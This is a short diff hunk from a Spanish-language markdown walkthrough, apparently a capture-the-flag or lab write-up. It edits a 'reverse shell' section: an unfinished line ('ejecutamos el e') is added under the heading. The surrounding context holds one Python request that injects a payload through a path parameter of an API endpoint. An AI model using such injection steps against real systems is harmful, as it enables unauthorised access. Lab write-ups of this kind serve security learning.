@@ -518,7 +518,7 @@ step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
 ```
 
 ### reverse shelll
-
+ejecutamos el e
 ![[Pasted image 20240908160423.png]]
 
 ### Enumeración del host HFS
